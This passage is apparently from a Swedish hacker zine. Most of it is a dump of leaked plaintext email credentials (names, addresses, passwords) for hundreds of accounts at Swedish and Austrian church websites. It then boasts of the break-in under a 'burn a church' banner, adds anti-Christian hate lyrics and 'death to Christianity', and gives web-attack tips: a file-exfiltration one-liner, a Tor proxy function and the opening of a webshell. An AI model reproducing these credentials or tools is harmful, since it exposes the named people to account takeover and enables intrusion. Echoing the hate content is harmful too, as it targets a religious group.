+jeffy	Jeffy Mwakalinga	jesusisalive.se	]£&7JL;-
+isaac	Isaac Mwenebatu	jesusisalive.se	baraka
+postmaster	Postmaster	jesusrock.nu	@xd@j2Ot
+postmaster	Postmaster	jesusisalive.se	*x09.9Ug
+robert	Robert Bergström	jesusnetwork.se	crb7741
+info	Info JesusNetwork	jesusnetwork.se	crb7741
+marcus	Marcus @ JesusRock	jesusrock.nu	chifen
+linus	Linus @ JesusRock	jesusrock.nu	gu3sswho
+filip	Filip @ JesusRock	jesusrock.nu	omw2rz
+postmaster	Postmaster	jesuszentrum.at	mGeUpD8*
+consolidation	consolidation	jesuszentrum.at	befestigung
+postmaster	Postmaster	jesustillhalmstad.nu	Z0QgFBWc
+ester	Ester	jesusisalive.se	queenester
+david	David @ JesusRock	jesusrock.nu	brodernamarx
+kristina	Kristina @ JesusRock	jesusrock.nu	tosteberg
+vem	Vision Evangelique Mondial	jesusisalive.se	umojaamani
+stany	Evangelist Stany	jesusisalive.se	delajoie
+adestrom	Carmelina Adeström	jesusmylord.se	kolingen
+ruth	Ruth Yohari	jesusisalive.se	aliyebarikiwa
+olivia	Olivia Omonombe	jesusisalive.se	affranchie
+postmaster	Postmaster	jesusmylord.se	Waqca5vT
+webmaster	Leif O Johansson	jesusmylord.se	all4jesus2
+info	Carmelina Adeström	jesusmylord.se	all4jesus
+mali	Mali	jesuszentrum.at	wTRwsBGY
+
+%kyrk%
+
+goran	Göran Söderberg	korskyrkan.cc	gor1213
+peterkarlsson	Peter Karlsson	vallhamrakyrkan.nu	eppe1966
+dennis	Dennis Hjalmarson	skogsrokyrkan.se	jallee
+bon	Böneämnen	missionskyrkanvaxjo.se	123456
+arabic	Arabiska Församlingen	centrumkyrkan.se	claudia
+lina	Lina Staaf	salemkyrkanhabo.se	LinSta06
+postmaster	Postmaster	turistkyrkan.info	cX*2sSJI
+ungdomspastor	Franz Hagman	pingstkyrkannassjo.nu	franzh
+christer.bergh	Christer Bergh	korskyrkan.nu	pioneer
+postmaster	Postmaster	korskyrkan.nu	2JTk42bd
+info	Korskyrkan Stockholm	korskyrkan.nu	bjg66
+gunilla.palmer	Gunilla Palmér	korskyrkan.nu	pek8Trec
+studio11	Närradion Brunnsparkskyrkan	brunnsparkskyrkan.org	wr97M8Hz
+pastorn	Eva Andreas	skaramissionskyrka.se	Rg10SkaM
+carin	Carin Hansen	centrumkyrkanfalun.se	nairobi
+rikard.eugenzon	Rikard Eugénzon	korskyrkan.cc	jabalam
+niclas.ojebrandt	Niclas Öjebrandt	korskyrkan.cc	nojeanna
+postmaster	Postmaster	korskyrkan.cc	%rNd5oxT
+citykvinna	Hanna Citykvinna	citykyrkan.se	citykvinna
+postmaster	Postmaster	vaxjomissionskyrka.se	DNE7eerf
+info	gamla adressen	turistkyrkanfuengirola.net	manilla
+postmaster	Postmaster	ahusfrikyrka.se	jgNb45RT
+waldemar.sjogren	Waldemar Sjogren	ahusfrikyrka.se	3745
+info	Åhus Frikyrka	ahusfrikyrka.se	3745
+webmaster	Webmaster Åhus Frikyrka	ahusfrikyrka.se	webmahus
+projektor	Projektor Citykyrkan	citykyrkan.se	projektor
+postmaster	Postmaster	skogakyrkan.se	958ywu6e
+webmaster	Webmaster Skogakyrkan	skogakyrkan.se	79i2j3by
+info	Skogakyrkan	skogakyrkan.se	43ANmuY5
+david.blondell	David Blondell	korskyrkan.nu	wwjd
+pastor	Jean Lebel	pingstkyrkannassjo.nu	jeanle
+info	Centrumkyrkan Hagfors	centrumkyrkan-hagfors.se	lyckokarr
+postmaster	Postmaster	husbykyrkan.com	scyK5wJc
+ungdom	Husbykyrkan - Ungdom	husbykyrkan.com	unHBkyrk
+pastorn	Husbykyrkan - Pastorn	husbykyrkan.com	paHBkyrk
+lars.morling	Lars Morling	husbykyrkan.com	LMHBkyrk
+info	Husbykyrkan	husbykyrkan.com	inHBkyrk
+webmaster	Emil Nyman	skaramissionskyrka.se	AsD456
+gonzo	Husbykurkan - Gonzo	husbykyrkan.com	maHBkyrk
+bengt.dalid	Bengt Dalid	korskyrkan.cc	BengtD
+ungdom	Ungdom	centrumkyrkanfalun.se	centralen
+postmaster	Postmaster	turistkyrkan.org	m5RxPwXd
+info	Skogsrokyrkan	skogsrokyrkan.se	infoskogsro
+webmaster	webmaster	hjortensbergskyrkan.se	web2008
+arni	Arni Arnason	centrumkyrkan.se	helgatage
+sondax	Karin Dernulf	centrumkyrkan.se	alfons
+postmaster	Postmaster	betlehemskyrkan.se	yC37T@hA
+mpop	Multipop Konto	betlehemskyrkan.se	XRr9qjxT
+asdasasdw	asdasasdw	hjortensbergskyrkan.se	asdasasdw
+postmaster	Postmaster	hjortensbergskyrkan.se	4!tcN4dM
+postmaster	Postmaster	skarpnackskyrkan.se	A7aHlg18
+postmaster	Postmaster	stockholmskyrkan.se	ebHpj5*h
+postmaster	Postmaster	xn--missionskyrkanvxj-4qb85a.se	%%FeSiCu
+postmaster	Postmaster	missionskyrkanvaxjo.se	pOi2LYYK
+postmaster	Postmaster	citykyrkan.se	2AuaVZz!
+jennifer	Jennifer Lönn	allianskyrkananeby.se	174859
+postmaster	Postmaster	soderhojdskyrkan.nu	lOIklG8Y
+christer	Christer Karlsson	allianskyrkananeby.se	kjH52Gd
+postmaster	Postmaster	salemkyrkan.nu	63cnIToT
+postmaster	Postmaster	pingstkyrkan-nacka.nu	a3.3PDYG
+josef	Josef Lindgren	centrumkyrkanfalun.se	kungen
+postmaster	Postmaster	sorbykyrkan.nu	*l.OFUCQ
+postmaster	Postmaster	korskyrkanumea.nu	7EbXffqR
+postmaster	Postmaster	elimkyrkan.nu	QJGqARy.
+postmaster	Postmaster	pingstkyrkan.tv	Km3xIG7b
+postmaster	Postmaster	grindtorpskyrkan.nu	84Q1m9Vv
+postmaster	Postmaster	centrumkyrkan-helsingborg.nu	33m!VvBf
+postmaster	Postmaster	hammarbykyrkan.nu	L#5HuV!u
+webmaster	Webmaster Centrumkyrkan	centrumkyrkan-hagfors.se	lyckokarr
+info	Allmän adress	pingstkyrkannassjo.nu	infonö
+postmaster	Postmaster	elimkyrkan.org	#s3VSp4z
+postmaster	Postmaster	brunnsparkskyrkan.org	UHz5Ot97
+postmaster	Postmaster	elimkyrkan.com	Kc!h6tIj
+postmaster	Postmaster	immanuelskyrkan.smf.se	uborakeD
+fastighet	Fastigheten	korskyrkan.nu	fastighet
+marica	Marica Burman	elimkyrkan.org	Gh47kop
+postmaster	Postmaster	vallhamrakyrkan.nu	N6zP2XnU
+postmaster	Postmaster	gnosjomissionskyrkan.org	ix%zextc
+postmaster	Postmaster	kyrkaniframtiden.com	MfY!BxO9
+postmaster	Postmaster	skaramissionskyrka.se	iPfB699l
+ungdomspastor	Sara Nyström	brunnsparkskyrkan.org	bpkyouthsara
+alpha	Karli Hayes	soderhojdskyrkan.nu	3CFrAYv9
+anethe.carlsson	Anethe Carlsson	pingstkyrkan-nacka.nu	757ccePL
+p_o	P-O Ängegärd	allianskyrkananeby.se	ukdnetn
+anton.carlsson	Anton Carlsson	korskyrkanumea.nu	Terracina
+barn	Barn Pingst Kungälv	pingstkyrkan.tv	w9Jf8ehe
+beo.mellergard	Beo Mellergård	grindtorpskyrkan.nu	D345vcn6
+boen	Bön Centrumk helsingborg	centrumkyrkan-helsingborg.nu	mnjh3t4
+britt	Britt Wennberg	hammarbykyrkan.nu	12345
+info	Gemensam e-post	vaxjomissionskyrka.se	info01
+musiker	Helene Olaison	vaxjomissionskyrka.se	musiker01
+andreas	andreas	hjortensbergskyrkan.se	saerdna
+8april	8april	elimkyrkan.org	Klipmar
+elsmarie.ekman	Elsmarie Ekman	korskyrkanumea.nu	kristina
+erik.johansson	Erik Johansson	sorbykyrkan.nu	ugeDvN2z
+elimnytt	Elimkyrkan	elimkyrkan.nu	tidning
+exp	Expedition Brunnsparkskyrkan	brunnsparkskyrkan.org	LLsevc2e
+info	Allianskyrkan Aneby	allianskyrkananeby.se	dkayik
+glory	Glory Sörbykyrkan	sorbykyrkan.nu	pAqf8349
+goranahlforn	Göran Ahlforn	hammarbykyrkan.nu	ccxTTR33
+postmaster	Postmaster	baptistkyrkaniuppsala.se	BxFtLcyL
+infobladet	Jenny Bergström	soderhojdskyrkan.nu	kyrkankyrkan
+hakan	ElimKyrkan Håkan	elimkyrkan.org	2853tbv2
+hanna	Hanna Skog	grindtorpskyrkan.nu	hspl
+henrikroos	Henrik Roos	hammarbykyrkan.nu	e5rw2aqq
+henriksjolund	Henrik Sjölund	hammarbykyrkan.nu	AA887ccn
+info	Centrumkyrkan Helsingborg	centrumkyrkan-helsingborg.nu	morarp
+info	Citykyrkan Örebro	citykyrkan.se	62376237
+info	Elimkyrkan Eskilstuna	elimkyrkan.com	ye6tr5aX
+info	Info Elimkyrkan	elimkyrkan.nu	message
+info	Elim Kyrkan	elimkyrkan.org	3t83tc55
+info	Info Grindtorpskyrkan	grindtorpskyrkan.nu	G94bvie9
+info	EFS Hammarbykyrkan	hammarbykyrkan.nu	yon2245a
+info	Info Immanuelskyrkan Skövde	immanuelskyrkan.smf.se	nBheyadD
+oskar	Oskar Nyström	soderhojdskyrkan.nu	45op89
+info	Info Pingst Kungälv	pingstkyrkan.tv	Le43s7x4
+info	Pingstkyrkan Nacka	pingstkyrkan-nacka.nu	TUR422ax
+postmaster	Postmaster	huskvarnaallianskyrka.nu	VKtXfWXA
+info	Kjell Söderblom	soderhojdskyrkan.nu	uew765mX
+postmaster	Postmaster	skogsrokyrkan.se	OFTpEBBl
+info	 Vallhamrakyrkan	vallhamrakyrkan.nu	261541
+inger	Inger Elimkyrkan	elimkyrkan.nu	AVTR65HGz
+projektorn	Projektorgruppen	malarokyrkan.se	staffan
+jan.lindeh	Jan Lindeh	citykyrkan.se	adonai
+jeanettebrorson	Jeanette Brorsson	hammarbykyrkan.nu	454ddqBX
+tv	TV-Citykyrkan	citykyrkan.se	62376237
+jenny	Jenny Tegnér	soderhojdskyrkan.nu	Jenny1
+postmaster	Postmaster	immanuelskyrkan.com	XHpGR1yp
+kaj	ElimKyrkan Kaj	elimkyrkan.org	27tm2tv2
+kjell	Kjell Elimkyrkan E-tuna	elimkyrkan.com	BMV7474a
+kjell	Kjell Söderström	soderhojdskyrkan.nu	nojKLDFJ
+kontakt	Kontakt Elimkyrkan E-tuna	elimkyrkan.com	wqasd65d
+kontakt	Kontakt Korskyrkan Umeå	korskyrkanumea.nu	esselte
+kontakt	Salemförsamlingen i Vargön	salemkyrkan.nu	23048vtm
+korstryck	Korstryck Umeå	korskyrkanumea.nu	korsum
+daniel.storm	Daniel Storm	citykyrkan.se	Y5pur3eb
+lars	Lars Pingst Kungälv	pingstkyrkan.tv	woew83hc
+carin	Carin Folkesson	immanuelskyrkan.com	sommar2006
+bed	Elimkyrkan	elimkyrkan.nu	Karlsson
+lenagranlund	Lena Granlund	hammarbykyrkan.nu	wew223XY
+lgs	LGS Elimkyrkan	elimkyrkan.org	heinv932
+carina.danling	Carina Danling	skogsrokyrkan.se	himmelen
+magnus	Magnus Ã…sebrant	gnosjomissionskyrkan.org	WE78sc62
+johan.lidberg	Johan Lidberg	skogsrokyrkan.se	villgiftasig
+roland	Roland Jansson	centrumkyrkan-hagfors.se	Gård85
+menno	Menno Elimkyrkan	elimkyrkan.org	jasper
+hemforsamling	Thomas Johansson m.fl	soderhojdskyrkan.nu	lillagruppen
+cicci	Cicci Hagevi	vaxjomissionskyrka.se	kotten
+mirjam.lundgren	Mirjam Lundgren	korskyrkanumea.nu	tiotio
+mission	Mission Brunnsparkskyrkan	brunnsparkskyrkan.org	uenvSmNx
+bengt	Bengt Johvallius	elimkyrkan.nu	gentle
+ml	Marie-Lousie Wiktorell	pingstkyrkan.tv	Lv7d5s33
+monica	Monica Sörbykyrkan	sorbykyrkan.nu	k38RMdra
+postmaster	Postmaster	skolkyrkan-nassjo.com	QDb5K!KM
+ordf	ordförande Immanuelskyrkan Skövde	immanuelskyrkan.smf.se	pwkUrTe3
+gustav	Gustav Ek	furuhojdskyrkan.se	gustav
+pastor	Pastor Immanuelskyrkan Skövde	immanuelskyrkan.smf.se	nxjeGTWJ
+pastor	Pastorn Pingstkyrkan Nacka	pingstkyrkan-nacka.nu	zvreubvo
+kassor	kassörerna	vallhamrakyrkan.nu	bgrara
+patrik.vallin	Patrik Vallin	citykyrkan.se	dollar27
+info	Skandinaviska Turistkyrkan	turistkyrkan.org	paserord
+per.carlqvist	Per Carlqvist	pingstkyrkan-nacka.nu	NBj3dt7g
+postmaster	Postmaster	centrumkyrkan.org	2fRrcbCx
+postmaster	Postmaster	botkyrkaposk.se	p!qKtvf5
+magnus.franck	Magnus Franck	citykyrkan.se	584927
+postmaster	Postmaster	malarokyrkan.nu	dXG83MeV
+roland.johansson	RolandJohansson Kyrkaniframtiden	kyrkaniframtiden.com	musmatta
+postmaster	Postmaster	malarokyrkan.se	.wkv6q7u
+erika	Erika Jarander	centrumkyrkan.se	helgatage
+smu	SMU Immanuelskyrkan Skövde	immanuelskyrkan.smf.se	gvNMDhe2
+helena	Helena Vanderlei	soderhojdskyrkan.nu	rt56f0Mk
+postmaster	Postmaster	centrumkyrkanbromolla.se	!o5pjHvg
+arne	Arne Henrysson	gnosjomissionskyrkan.org	Kfhc04
+tonar	Tonar Elimkyrkan E-tuna	elimkyrkan.com	BNBN44ay
+maria	Maria Nielsen	goteborgskyrkan.se	worship_forever
+ulf.lundin	Ulf Lundin	citykyrkan.se	62376237
+ung	Ung Grindtorpskyrkan	grindtorpskyrkan.nu	yen38aC3
+ungdom	Ungdom Brunnsparkskyrkan	brunnsparkskyrkan.org	ieGd3fnA
+ungdomarna	Ungdomarna Pingst Kungälv	pingstkyrkan.tv	LPvy78st
+webbredaktor	Webbredaktör Hammarbykyrkan	hammarbykyrkan.nu	nathorst
+pastor	Niclas Forsberg	brunnsparkskyrkan.org	uevb3jmr
+webmaster	Webmaster Brunnsparkskyrkan	brunnsparkskyrkan.org	hsndeuiQ
+webmaster	Webmaster Elimkyrkan	elimkyrkan.nu	message
+webmaster	Webmaster Immanuelskyrkan Skövde	immanuelskyrkan.smf.se	sYeb34jh
+webmaster	Webmaster Korskyrkan Umeå	korskyrkanumea.nu	bhig3be
+webmaster	Webmaster Pingstkyrkan Nacka	pingstkyrkan-nacka.nu	hDuei47f
+webmaster	Michael Schånberg	soderhojdskyrkan.nu	79giug5
+jennie	Jennie Wallengren	salemkyrkanhabo.se	JenWal06
+mia.berggren	Mia Berggren	vaxjomissionskyrka.se	filur06
+mission	Elimkyrkans mission	elimkyrkan.nu	wholeworld
+postmaster	Postmaster	frikyrkan.se	Ykt#HUia
+webmaster	webmaster	vaxjomissionskyrka.se	mebwaster
+postmaster	Postmaster	centrumkyrkan-hagfors.se	FY#5.3sw
+anette	Anette Eidenskog	ulriksbergskyrkan.se	nettan
+lena.tellebo	Lena Tellebo	malarokyrkan.se	stanley
+postmaster	Postmaster	orbykyrkan.se	g5yqba9p7
+info	Örbykyrkan	orbykyrkan.se	ingo
+webmaster	Webmaster Örbykyrkan	orbykyrkan.se	ingo
+ung	Barn och Ungdomsaktiviteter	orbykyrkan.se	ingo
+pastor	Rosmarie Källberg	orbykyrkan.se	ingo
+pastor	Gunnar Pettersson	vaxjomissionskyrka.se	rotsap1
+media	Mediagruppen	furuhojdskyrkan.se	mikrofon
+info	Info Stockholmskyrkan.se	stockholmskyrkan.se	9mtmRCa8
+odd	Odd Stockholmskyrkan	stockholmskyrkan.se	9mtmRCa8
+kontakt	kontakt	raddakyrkan.se	churchsaver
+kontoret	UBK Expeditionen	ulriksbergskyrkan.se	hemul1
+barnmusik	Lotta Åblad	brunnsparkskyrkan.org	6ekliden5
+mission	Missionsradet	vallhamrakyrkan.nu	264086
+roland.hermansson	Roland Hermansson	vallhamrakyrkan.nu	264086
+johnnymansson	Johnny Månsson	centrumkyrkanbromolla.se	birger3415
+carl-johan.freed	Carl-Johan R Freed	skarpnackskyrkan.se	qwe123
+ordforande	Ninni Larsson	skaramissionskyrka.se	Rg10SkaM
+admin	Lars-Erik Svensson	skaramissionskyrka.se	Rg10SkaM
+smu	Skara SMU	skaramissionskyrka.se	Rg10SkaM
+info	Skara Missionsforsamling	skaramissionskyrka.se	Rg10SkaM
+lisa	Lisa Hayes	soderhojdskyrkan.nu	56er78ui
+rickard	Rickard Gunnargård	pingstkyrkan.tv	poWer2coM
+postmaster	Postmaster	leksand.missionskyrkan.se	eTeFR@ai
+info	Info CentrumKyrkan	centrumkyrkan.org	CrOssNet01!
+merzek	Mercek Botros	centrumkyrkan.se	egypten
+ullabritt	Ulla-Britt Valfridsson	vaxjomissionskyrka.se	valf48
+smu	Stina Larsson	vaxjomissionskyrka.se	18141
+ordf.smu	Emanuel Tirenå	vaxjomissionskyrka.se	curry10
+postmaster	Postmaster	ulriksbergskyrkan.se	1Tv7eD4a
+nytt	Nytt	vaxjomissionskyrka.se	nytt01
+media	Skogsrokyrkan Media	skogsrokyrkan.se	medialösen
+postmaster	Postmaster	xn--gteborgskyrkan-vpb.se	3YfU4Q4V
+postmaster	Postmaster	goteborgskyrkan.se	c2tyCGWS
+anders.svedstam	Anders Svedstam	vallhamrakyrkan.nu	jamina
+postmaster	Postmaster	kungalvsmissionskyrka.se	e#HMe4xn
+per	Per Johansson	elimkyrkan.nu	dataproffs
+pastorn	Lennart Åkerlund	kungalvsmissionskyrka.se	leonardo
+hakan	Elimkyrkan	elimkyrkan.nu	appelskog
+anna	Elimkyrkan	elimkyrkan.nu	praise
+postmaster	Postmaster	filadelfiakyrkan.se	GCTtq@CA
+it	ITkonto	filadelfiakyrkan.se	tre3fyra4
+postmaster	Postmaster	frikyrkangnesta.se	MjPcN*WP
+goran.lindstrom	Göran Lindström	citykyrkan.se	62376237
+lissi	Lissi Karlsson	immanuelskyrkan.com	kanelbulle
+hans	Hans Carlen	immanuelskyrkan.com	carlen
+jan	Jan Eirestal	immanuelskyrkan.com	jaguar
+postmaster	Postmaster	pingstkyrkannassjo.nu	.VEXr7ej
+expedition	Expedition	immanuelskyrkan.com	sommarlov
+postmaster	Postmaster	centrumkyrkan.se	zMWz6ara
+stanley	Stanley Sjöberg	centrumkyrkan.se	helgatage
+margareta	Margareta Eriksson-Höök	centrumkyrkan.se	helgatage
+lis	Lis Jacobsson	centrumkyrkan.se	helgatage
+bertil	Bertil Edin	centrumkyrkan.se	helgatage
+carin	Carin Ottosson	centrumkyrkan.se	helgatage
+gustaf	Gustaf Björkman	centrumkyrkan.se	helgatage
+info	Centrumkyrkan	centrumkyrkan.se	helgatage
+daniel	Daniel Gustavsson	centrumkyrkan-hagfors.se	jesuslever
+jonas	Jonas Castor	immanuelskyrkan.com	ultimate
+majlis	Maj-Lis Wahlstrom	immanuelskyrkan.com	hallon
+sts	Sondag till Sondag	immanuelskyrkan.com	veckobladet
+webmaster	Webmaster	immanuelskyrkan.com	webimmcom
+postmaster	Postmaster	kinnamissionskyrka.nu	czsNO.oz
+sms	sms brygga	malarokyrkan.se	ibiza2004
+fadder	Fadderbarn	centrumkyrkanfalun.se	fadderbarn
+webmaster	webmaster	centrumkyrkanbromolla.se	90VendettaPH10
+daniel	Daniel Jakobsson	sorbykyrkan.nu	Joh3:16
+andrew.thompson	Andrew Thompson	korskyrkan.nu	0365
+postmaster	Postmaster	tenstakyrkan.se	R*dktu*J
+anders	Anders Solberg	elimkyrkan.org	mumsol
+ungdomspastor	Marcus Boberg	kungalvsmissionskyrka.se	ag4444
+web	webansvarig i Elimkyrkan	elimkyrkan.org	elimweb
+ekonomi	ekonomi@immanuelskyrkan.com	immanuelskyrkan.com	pengar
+postmaster	Postmaster	centrumkyrkanfalun.se	9uK#ewV9
+tina	Tina - Sörbykyrkan	sorbykyrkan.nu	GodMat07
+klas	Klas Niklasson	sorbykyrkan.nu	Psalm23!
+helen	Helen Olsson	elimkyrkan.com	olsson
+gunnar.swahn	Gunnar Swahn	filadelfiakyrkan.se	papua
+eva.adelroth	Eva Ädelroth	filadelfiakyrkan.se	ea1517
+stig	Stig Bomberhult	ulriksbergskyrkan.se	ulrik1
+bjorn	Björn Strömvall	ulriksbergskyrkan.se	ulrik1
+dan	Dan Appelgren	ulriksbergskyrkan.se	hemul1
+tobias	Tobias Karlhager	filadelfiakyrkan.se	tobbec
+eric	Eric Andersson	centrumkyrkan.se	golgata
+skold	Skoldfamily	vallhamrakyrkan.nu	sennan
+info	Kinna Missionsförsamling	kinnamissionskyrka.nu	kinnamission
+service	Service	korskyrkan.nu	serv66
+kosovo	Kosovomail	vallhamrakyrkan.nu	cisco4800
+kristine.arapovic.lindetorp	Kristine Arapovic Lindetorp	korskyrkan.nu	kricko
+hanna	Hanna Roman	citykyrkan.se	hannaskolan
+soppkvallar	soppkvallar	centrumkyrkan.se	centrum
+ingemar	ingemar	hjortensbergskyrkan.se	ramegni
+nyhetsbrev	Nyhetsbrev	malarokyrkan.se	ibiza2004
+postmaster	Postmaster	fredstorgskyrkan.org	lYooGCmF
+postmaster	Postmaster	furuhojdskyrkan.se	qOOL8rJ*
+lasse	Lars Leven	furuhojdskyrkan.se	lasse
+gunilla	Gunilla Petersen	furuhojdskyrkan.se	gunilla
+smulan	Smulans forskola	furuhojdskyrkan.se	smulan
+info	info	fredstorgskyrkan.org	Fredstorget
+postmaster	Postmaster	raddakyrkan.se	GJ0kWs6O
+david.johansson	David Johansson	elimkyrkan.org	elimsalt
+webmaster	Petra Johfur	raddakyrkan.se	churchsaver
+styrelsen.2008	Styrelsen 2008	skarpnackskyrkan.se	zxc123
+emma	Emma Gustafson	skogsrokyrkan.se	ungdomsledare
+julmarknad	julmarknad	furuhojdskyrkan.se	julmarknad
+furuf	Furuf, ungdomsledarna	furuhojdskyrkan.se	furuf5
+postmaster	Postmaster	salemkyrkanhabo.se	3ukU!9pA
+kulturkollo	Grindtorpskyrkans kulturkollo	grindtorpskyrkan.nu	luk1816
+jonas	Jonas Abrahamsson	gnosjomissionskyrkan.org	ja82gm05
+erik	Erik T	ulriksbergskyrkan.se	101010
+joe	Joseph F Lupo Anderson	botkyrkaposk.se	lykanthrop
+camilla	Camilla Lif	botkyrkaposk.se	huggorm
+ragnhild	Ragnhild Danell	botkyrkaposk.se	menlÃ¶sa
+jenny.rombo	Jenny Rombo	skarpnackskyrkan.se	busjenny
+eva.rietz	Eva Rietz	ahusfrikyrka.se	solgatan
+admin	Robert Sundström	betaniakyrkan.nu	xzcgtWs
+postmaster	Postmaster	allianskyrkananeby.se	YWaZIo0.
+postmaster	Postmaster	storstadskyrkan.se	YngCc!tp
+info	Information Salemkyrkan Habo	salemkyrkanhabo.se	Jesus
+postmaster	Postmaster	kyrkaninackacentrum.se	Fu%xENK@
+datagruppen	Datagruppen	skarpnackskyrkan.se	qwe321
+kontakt	Skarpnackskyrkan	skarpnackskyrkan.se	qwe321
+kina	Kina Halvarsson	centrumkyrkan.se	helgatage
+postmaster	Postmaster	honomissionskyrka.se	2GT@mZRz
+angela.berger	Angela Berger	citykyrkan.se	forskare
+info	Mälarökyrkan	malarokyrkan.se	stanley
+jonasnord	Jonas Nord	immanuelskyrkan.com	oraetlabora
+simon	Simon	immanuelskyrkan.com	vaktis
+anna.karlsson	Anna Karlsson	missionskyrkanvaxjo.se	anna123
+ann-josefine.possebo	Ann-Josefine Possebo	skarpnackskyrkan.se	diakon
+karin	karin	hjortensbergskyrkan.se	knirak
+postmaster	Postmaster	citykyrkan.net	hA93w63p
+lennart	Lennart Nilsson	sorbykyrkan.nu	Chrysler
+cafeiller	Café Iller	skarpnackskyrkan.se	åberg
+tidningen	Församlings-tidningen	immanuelskyrkan.com	immanuel
+thomas	Thomas Wikström	centrumkyrkanfalun.se	salami
+henrik	Henrik	centrumkyrkanfalun.se	lillagubben
+gunilla	Gunilla Tell	centrumkyrkanfalun.se	grafik
+info	Expeditionen	centrumkyrkanfalun.se	expedition
+vaxthuset	Barn och föräldrar	centrumkyrkanfalun.se	ckbarn
+be	Bönemail	centrumkyrkanfalun.se	prayer
+sondagsskolan	Söndagskolan Citykyrkan	citykyrkan.se	sondagcCk
+tv	tvkyrkan	centrumkyrkan.se	anki
+hanna	Hanna Åkerlund	immanuelskyrkan.com	vinter2007
+hanna.blasczyk	Hanna Blasczyk	citykyrkan.se	fanny0581
+katrin.angestjarna	Katrin Angestjärna	citykyrkan.se	MKEJJ6218
+edward	Edward Mampuya	centrumkyrkan.se	mampuya
+franska	Afrikanska församlingen	centrumkyrkan.se	mampuya
+postmaster	Postmaster	betaniakyrkan.nu	nih%tkaC
+webmaster	Robert Sundström	betaniakyrkan.nu	orkanen
+lars-inge	Lars-Inge Larsson	betaniakyrkan.nu	lillen07
+eva-britt	Eva-Britt	allianskyrkananeby.se	a1jk72
+fredrik	Fredrik Lignell	betaniakyrkan.nu	fredrik07
+maria	Maria Fagré	betaniakyrkan.nu	daniel
+anmalan	Anmälan	kinnamissionskyrka.nu	kinnamission
+info	Info@norrortskyrkan.se	norrortskyrkan.se	in112a
+info	Göteborgskyrkan	goteborgskyrkan.se	gsbfod
+postmaster	Postmaster	norrortskyrkan.se	MEi5ul#k
+jonas.alteryd	Jonas Alteryd	kinnamissionskyrka.nu	barabarambaya
+smulan2	smulan2	furuhojdskyrkan.se	personal
+richard.svensson	Richard Svensson	norrortskyrkan.se	norrortskyrkan
+postmaster	Postmaster	lagadalskyrkan.se	pjTNCYp3
+kim	kim	lagadalskyrkan.se	Juseki43
+johan	johan	lagadalskyrkan.se	Tredjeh27
+info	info	lagadalskyrkan.se	Horten543
+info	info	hjortensbergskyrkan.se	web2008
+hakan.zwahlen	Håkan Zwahlen	norrortskyrkan.se	norrortskyrkan
+dan.gustafsson	Dan Gustafsson	norrortskyrkan.se	bertils9
+postmaster	Postmaster	pingstkyrkan.se	JQFxL1%t
+lisa.magnusson	Lisa Magnusson	missionskyrkanvaxjo.se	solsken
+soppkvall	soppkvall	centrumkyrkan.se	helgatage
+karl.palm	Karl Palm	korskyrkan.nu	skatteby
+anders.elfstrom	Anders Elfström	missionskyrkanvaxjo.se	peking
+rikard.eugenzon	Rikard Eugénzon	salemkyrkan.nu	Joh17:4
+kontaktbladet	Kontaktbladet	kinnamissionskyrka.nu	kinnamission
+pastor	pastor	turistkyrkan.info	manilla
+kontakt	kontakt	turistkyrkan.info	manilla
+sangledare	sangledare	turistkyrkan.info	manilla
+postmaster	Postmaster	turistkyrkanfuengirola.net	49H7bJKj
+postmaster	Postmaster	huskvarnaallianskyrka.se	ERhW%sGC
+ronnbaret	Rönnbäret	kinnamissionskyrka.nu	GudsBarn
+radu	Radu Mirza	furuhojdskyrkan.se	radu777
+anna	Anna Johansson	ulriksbergskyrkan.se	annajo
+maritta.zwahlen	Maritta Zwahlen	norrortskyrkan.se	norrortskyrkan
+per-martin.palm	Per-Martin Palm	korskyrkan.nu	wormack
+christina	christina	hjortensbergskyrkan.se	anitsirhc
+tobias	tobias	hjortensbergskyrkan.se	saibot
+renee	renee	hjortensbergskyrkan.se	seener
+scout	scout	hjortensbergskyrkan.se	scouting
+
+logga in gör man på crossnet.net eller nått.
+
+++++++++++++++++++++++++
+| VFH MIZZIONZZZ #00098:
+| BRÄNN EN KYRKA!!
+++++++++++++++++++++++++
+
+Finns mycket att ta med sig från detta. Lägger man bara ner lite tid och riktar
+sin ilska åt rätt håll kan "vanliga" webbsidor leda till annat.
+
+Observera: Tid, tålamod och kunskap är vad som krävs. Även om det i dessa 
+loggar ser enkelt ut är det timmar som lagts ner på att se över hur systemen 
+fungerar. Och det är oftast så det ligger till. Och det är ju det som är det
+roliga... Pratar inte datan som du vill, tänk om och lura skiten ur systemet. 
+Datorer är binära slavstationer åt oss människor, glöm inte det!
+
+Nu lite tunez som vi tycker passar mer än väl till detta:
+
+Human reality feeds upon a whore!
+For what idols have these lowlives
+bowed their heads to build up a shattered world?
+Kill the bitch on the cross...
+Scorn their sacred loss!
+And the sheep are making love to the madness of the flow!
+Is this all they know...?
+
+DÖD ÅT KRISTENDOM.
+
+..............................
+. 06 w3bbk0d3z 0ch w3bbvulnz..
++----------------------------+
+
+Lite användbara knep för webben. Mycket av det är väldigt simpelt, men
+användbart!
+
+-- Korta tips & trix
+====================
+
+Ladda upp kod med php:
+php -r "echo base64_encode(file_get_contents(----FILNAMN----))" > dump
+Bankas snabbt in i ett skript.
+
+Smussla fram information:
+http://robtex.com/dns/
+Skriv en egen klient för att parse'a deras sajt så har du en väldigt bra lista
+på vilka hosts som finns att tillgå.
+
+För att splippa duplicerad kod i följande snuttar har ni här funktionen pr0xy:
+
+-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<
+
+define('PROXY_HOST', '127.0.0.1');
+define('PROXY_PORT', '8118'); // privoxy,tor
+
+function pr0xy($url){
+                $proxy = PROXY_HOST . ':' . PROXY_PORT;
+                $hcurl = curl_init(); 
+                curl_setopt($hcurl, CURLOPT_PROXY, $proxy);
+                curl_setopt($hcurl, CURLOPT_HEADER, 1);  
+                curl_setopt($hcurl, CURLOPT_USERAGENT, 
+				'Opera/9.2 (Linux 2.6; en-US;)'); 
+                curl_setopt($hcurl, CURLOPT_URL, $url);
+                curl_setopt($hcurl, CURLOPT_RETURNTRANSFER, 1); 
+                curl_setopt($hcurl, CURLOPT_FOLLOWLOCATION, 1);
+                curl_setopt($hcurl, CURLOPT_TIMEOUT, '300');
+                $ret = curl_exec($hcurl);
+                curl_close($hcurl);
+
+                return $ret;
+}
+
+-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<-8<
+
+-- Webbskal
+===========
+
+<?php
+/** PRIVAT-KOD-VFH-LABS ***********************************
